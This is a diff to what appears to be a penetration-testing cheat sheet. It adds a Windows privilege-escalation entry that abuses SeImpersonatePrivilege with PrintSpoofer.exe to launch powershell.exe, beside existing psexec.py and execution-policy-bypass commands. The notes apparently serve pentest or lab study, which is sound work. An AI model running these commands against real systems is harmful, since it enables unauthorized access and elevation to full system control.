@@ -243,6 +243,11 @@ dir /a:h `show only hidden files`<br/>
 ### Psexec.py
 ` python psexec.py DOMAIN/USER:PASS@IP`
 
+### Privlege Escalation using SeImpersonatePrivilege
+
+If this is enabled we can upload `Printspoofer.exe ` and place it if we have rights  
+
+`PrintSpoofer.exe -i -c powershell.exe`
 
 ### Active Directory
 `powershell -ep bypass`  load a powershell shell with execution policy bypassed <br/>
